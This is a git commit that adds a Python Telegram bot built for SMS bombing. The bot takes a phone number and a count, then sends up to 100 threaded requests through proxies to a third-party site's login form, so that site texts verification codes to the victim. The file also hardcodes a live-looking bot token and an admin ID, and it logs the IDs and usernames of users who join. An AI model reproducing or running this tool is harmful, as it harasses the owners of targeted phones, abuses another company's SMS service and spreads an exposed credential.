d35dbc632c62960e57c790177b1b78700d075c01
〆M̂Ŕ. ʂÏLĘNԷ〆 <88721343+Mrsilent501@users.noreply.github.com>
2021-09-30 02:51:04 +0200

    Create bot.py

---
+++ bot.py
@@ -0,0 +1,141 @@
+import requests
+import threading
+import telebot
+from telebot import types
+from time import sleep
+import random
+Done = 0
+Error = 0
+token = ('2039128835:AAF7WbeYlLtCij6NCKFPo0jcqPz3TM23Hpo')
+bot = telebot.TeleBot(token)
+@bot.message_handler(commands=['start'])
+def start(message):
+    adminid = ["1875412243"]
+    if message.chat.type == 'private':
+        startsms = """
+🏴‍☠ Hello In Bot </END GAME>
+🕷 To Spam Any Numper
+📤 Send ==> /sendsms
+        """
+        sent = bot.send_message(message.chat.id, text=startsms)
+        users = open("users.py", "r")
+        users = users.read()
+        if str(message.chat.id) not in str(adminid):
+            if str(message.chat.id) not in str(users):
+                bot.send_message("1875412243", f"""
+✈ Hello Silent New Users Joind
+      👽 User --> @{message.chat.username} 
+      🤖 id   --> {message.chat.id} """)
+                users = open("users.py", "a")
+                userswrite = str(message.chat.id), "==> ", str(message.chat.username)
+                users.write(str(userswrite))
+                users.write("")
+                users.close()
+#######################################################################
+@bot.message_handler(commands=['sendsms'])
+def sendsms(message):
+        if message.chat.type == 'private':
+            global Done,Error
+            sendmessage = """
+Welcom Back👋 , To Spam Send 📤
+   ✅ Numper:Numper_of_SmS
+   
+🔰 Ex:
+   ✅ 01256359875:10
+        """
+            bot.send_message(message.chat.id, text=sendmessage)
+        @bot.message_handler(func=lambda message: True)
+        def sendmessage(message):
+            if "012" in str(message.text):
+                try:
+                    num = message.text.split(':')[0]
+                    pass
+                except:
+                    bot.send_message(message.chat.id, "🛑 Error In Numper [?]")
+                    pass
+                try:
+                    count = message.text.split(':')[1]
+                except:
+                    bot.send_message(message.chat.id, "🛑 Error In Msg [?]")
+                try:
+                    if int(count) <= 100:
+                        hd = {
+    "Host": "oleorange.com",
+    "Connection": "keep-alive",
+    "Content-Length": "427",
+    "Cache-Control": "max-age\u003d0",
+    "Upgrade-Insecure-Requests": "1",
+    "Origin": "http://oleorange.com",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9",
+    "Referer": "http://oleorange.com/login",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "en-US,en;q\u003d0.9,ar-EG;q\u003d0.8,ar;q\u003d0.7",
+    "Cookie": "_ga\u003dGA1.2.2019747161.1622654085; _gid\u003dGA1.2.875712095.1622808599; _gat_gtag_UA_143099725_1\u003d1"
+  }
+  
+                        url = 'http://oleorange.com/login'
+  
+                        data = {
+'__LASTFOCUS':'',
+'__EVENTTARGET':'',
+'__EVENTARGUMENT':'',
+'__VIEWSTATE':'FiJazqnh5l2e4/1lyIWN3lakRXyZNjFJthGqPukpX2TtR1N+VIb02ifPnQ+/3O+M5h9MHeGWFvrSoUsKrrmNkED0KOXFvBM1oINY/Kqqst0=',
+'__VIEWSTATEGENERATOR':'C2EE9ABB',
+'__EVENTVALIDATION':'hEOV7KjACybySncpY5zItuxpqfj6QvyvZw4yW32GCm+dQkoEIFYMEeY8OR3c9NrKpqmVoCuE6MzVi6UnGIGNxafDx/4ZiQ79/yyfimp4fKUAIcifYGHFPlni6d9VqkGknol5SuJh2chhtGflg1pTAQ==',
+'txtPhone':num,
+'btnLogin':'Access'
+}
+
+                        listprox = ["142.93.167.225:8080", "142.93.167.225:3128"]
+                        proxrand = random.choice(listprox)
+                        prox = {
+		    "http": "http://%s"%proxrand
+		    }
+                        def spam(): 
+                            try:
+                                r = requests.post(url, headers=hd, data=data, proxies=prox).text
+                                if 'rfvtxtVerificationCode' in r:
+    	                            bot.send_message(message.chat.id, text='✅ Done Send SMS ☠', parse_mode='markdown')
+    	                            pass
+                                else:
+                                    bot.send_message(message.chat.id, text='❌ Sorry Donot Send Message ..❗', parse_mode='markdown')
+                                    pass
+                            except:
+                                bot.send_message(message.chat.id, text="""
+            Error You Donot Send Numper
+            Send --> /sendsms Again""")
+                                pass
+                        thread = []
+                        for i in range(int(count)):
+                            thread1 =threading.Thread(target=spam)
+                            thread1.start()
+                            thread.append(thread1)
+                        for thread2 in thread:
+                            thread2.join
+                    else:
+                        bot.send_message(message.chat.id, """
+[@] Sorry !
+<< You Can Send 100 Msg Only >>
+      ->> By Silent : /sendsms
+""")
+                except:
+                    pass
+@bot.message_handler(commands=['Users'])
+def usersjoined(message):
+    if str(message.chat.id) == "1875412243":
+        users = open("users.py", "r")
+        users = users.read()
+        bot.send_message(message.chat.id, f"""
+Hello Owner This Is Users And ID:
+{users}
+        """)
+
+
+
+
+
+
+
+bot.polling(True)
